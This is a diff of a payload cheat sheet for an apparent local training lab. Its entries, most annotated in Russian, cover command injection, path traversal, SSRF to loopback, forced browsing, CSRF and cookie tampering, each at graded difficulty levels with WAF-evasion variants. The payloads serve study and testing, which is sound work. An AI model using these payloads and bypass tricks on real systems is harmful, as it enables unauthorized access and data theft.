@@ -30,7 +30,7 @@ WAF Bypass (обходит L1, блокируется на L2):
 
 
 --------------------------------------------------------------------
-3. BURP SUITE (POST /vault)
+3. BURP SUITE / ACCESS CONTROL (POST /vault)
 
 Low:
 is_admin=true
@@ -48,3 +48,94 @@ Cookie: user_role=guest; auth_token=dXNlcj1hZG1pbg==; vault_sig=52c876f2a6920569
 WAF Bypass (обходит L1, блокируется на L2):
 X-Forwarded-For: localhost
 Cookie: user_role=guest; auth_token=dXNlcj1BRE1JTg==
+
+
+--------------------------------------------------------------------
+4. COMMAND INJECTION / RCE (POST /rce)
+
+Low:
+127.0.0.1 && whoami
+
+Medium:
+127.0.0.1 | whoami
+
+High:
+127.0.0.1&whoami
+
+WAF Bypass (обходит L1, блокируется на L2):
+127.0.0.1&w'h'o'a'm'i
+
+
+--------------------------------------------------------------------
+5. PATH TRAVERSAL / LFI (GET /lfi?doc=)
+
+Low:
+secret_exam_key.txt
+
+Medium:
+....//....//course_files/secret_exam_key.txt
+
+High:
+syllabus_cs404.txt/../../course_files/secret_exam_key.txt
+
+WAF Bypass (обходит L1, блокируется на L2):
+..%2f..%2fcourse_files%2fsecret_exam_key.txt
+
+
+--------------------------------------------------------------------
+6. SSRF (POST /ssrf)
+
+Low:
+http://127.0.0.1:5002/admin/secret-keys
+
+Medium:
+http://2130706433:5002/admin/secret-keys
+
+High:
+http://0x7f000001:5002/admin/secret-keys
+
+WAF Bypass (обходит L1, блокируется на L2):
+http://[::1]:5002/admin/secret-keys
+
+
+--------------------------------------------------------------------
+7. FORCED BROWSING / UNRESTRICTED URL ACCESS (GET /portal/<path>)
+(Атака выполняется прямым изменением URL в адресной строке браузера)
+
+Normal / Public:
+http://127.0.0.1:5001/portal/student-dashboard
+
+Low (Прямой ввод закрытого URL в адресную строку браузера):
+http://127.0.0.1:5001/portal/admin-console
+
+Medium (Обход блэклиста через URL-encoding или Case Evasion):
+http://127.0.0.1:5001/portal/%61dmin-console
+(или http://127.0.0.1:5001/portal/ADMIN-CONSOLE)
+
+High (Обход белого списка через переход в каталог faculty или encoded dot-segment %2e%2e):
+http://127.0.0.1:5001/portal/faculty/%2e%2e/admin-console
+(или http://127.0.0.1:5001/portal/faculty/admin-console)
+
+WAF Bypass (URL encoded dot-segment %2e%2e - обходит L1, блокируется на L2):
+http://127.0.0.1:5001/portal/faculty/%2e%2e/admin-console
+
+
+--------------------------------------------------------------------
+8. CSRF (POST /csrf/change-email)
+
+Low:
+POST /csrf/change-email
+email=attacker@evil.com
+
+Medium:
+Referer: http://attacker.com/?ref=127.0.0.1
+POST /csrf/change-email
+email=attacker@evil.com
+
+High:
+X-Requested-With: XMLHttpRequest
+POST /csrf/change-email
+email=attacker@evil.com
+
+WAF Bypass (Method Tampering - обходит L1):
+GET /csrf/change-email?email=attacker_bypass@evil.com
